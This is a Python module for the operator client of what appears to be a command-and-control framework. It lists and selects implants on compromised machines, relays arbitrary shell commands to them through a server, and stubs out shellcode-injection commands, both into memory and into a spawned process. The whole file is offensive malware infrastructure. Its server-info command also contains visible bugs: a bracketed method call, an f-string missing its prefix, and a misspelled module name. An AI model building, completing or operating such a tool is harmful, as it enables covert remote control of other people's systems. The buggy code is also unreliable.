import requests
from typing import List
from . import client_globals
from . import client_errors
from . import storage
from . import encryption

### This is the file that descibes the functions that handle client commands

# Helper function to check if the client is currently selected an implant
def connected_to_implant() -> bool:
    if client_globals.instance_db.selected_implant == "":
        return False
    return True

# Helper function to update the global implant_db
def update_implant_db():
    url = "/admin/update/implants"
    server = client_globals.instance_db.server
    port = client_globals.instance_db.port

    # Send the request and assign the response to the global implant db 
    client_globals.instance_db.implant_db = requests.get(f"{server}:{port}{url}").json()["implant_db"]


# Helper function that prints a success message for implant commands
def print_success(cmd_id: str, args: List[str], app):
    app.get_child_by_id("command_output").print(f"The command \'{' '.join(args)}\' with ID {cmd_id} was successfully sent to implant \'{client_globals.instance_db.selected_implant}\'")

# Helper function that sends just a command
def post_command(cmd_str: str, cmd_type: storage.CMD_TYPE, cmd_id: str):
    
    json_data = {
                "username": client_globals.instance_db.operator_name,
                "implant_name": client_globals.instance_db.selected_implant,
                "cmd_type": cmd_type.value,
                "command_id": cmd_id,
                "arguments": cmd_str
    }
    
    url = "/admin/management"

    requests.post(client_globals.instance_db.server+
                         ":"+
                         client_globals.instance_db.port+
                         url,
                         json=json_data
                         )
    return

# Command that selects an implant
def cmd_select(args: List[str], app):
    # Check for the length of args and raise appropriate exception
    client_errors.arg_len_error(args, max=2, min=2)

    # Need to query the server to make sure the implant_db is updated
    update_implant_db()

    # Now make sure that the selected implant exists
    if args[1] not in client_globals.instance_db.implant_db:
        raise client_errors.ImplantDoesntExist

    # Update the global selected implant
    client_globals.instance_db.selected_implant = args[1]

    # Update the border of command_output
    app.get_child_by_id("command_output").border_title = f"Command Output - Connected to {args[1]}"

    # Print a success message to the command Output
    app.get_child_by_id("command_output").print(f"Successfully connected to {args[1]}")

    return

# Command that sends a shell command to the server for an implant
def cmd_shell(args: List[str], app):
    # Error if not connected to an implant
    if not connected_to_implant():
        raise client_errors.NotConnectedToImplant
    # Error if there are no other args provided
    client_errors.arg_len_error(args, min=2, max=1000)

    # Get an ID for the command
    id = encryption.id_generator(N=32)

    # The params to serialize should just be one string, not each part of the command
    # separated by ::: delimiter
    shell_str = [' '.join(args[1:])]

    # Serialize the command
    cmd_str = storage.create_command_str(id, storage.CMD_TYPE.CMD_SHELL, shell_str)  

    # Send the cmd_str
    post_command(cmd_str, storage.CMD_TYPE.CMD_SHELL, id)

    # Print the implant message success to screen
    print_success(id, args, app)

    return

# Command that sends a shellcode file to the server as well as a command
# The command is read first, and tells the implant where to pull the 
# shellcode file from on the server, reads it into memory, and executes
def cmd_shellcode_inject(args: List[str], app):
    return
# Different method of shellcode injection, this creates a process and injects it
# into it, same client -> server -> implant transfer method as shellcode_inject
def cmd_shellcode_spawn(args: List[str], app):
    return

# All associated server commands
def cmd_server(args: List[str], app):
    # Check for at least 2 args initially
    client_errors.arg_len_error(args, max=1000, min=2)

    # Match on the second word
    match args[1]:
        # server info 
        case "info":
            # Must be 2 args long
            client_errors.arg_len_error(args, max=2, min=2)
            # Print the server info to the command output
            app.get_child_by_id["command_output"].print("Currently connected to {client_globals.instance_db.server} on port {client_global.instance_db.port} as \'{client_globals.instance_db.operator_name}\'")
        case _:
            raise client_errors.CommandDoesntExist

    return

# Exits the client, the suplimentary args should be empty
def cmd_exit(args: List[str], app):
    return

# Here is the dict of supported commands 
CMD_TABLE = {
                "server": cmd_server,
                "exit": cmd_exit,
                "select": cmd_select,
                "shell": cmd_shell,
                "shellcode-inject": cmd_shellcode_inject,
                "shellcode-spawn": cmd_shellcode_spawn,
}

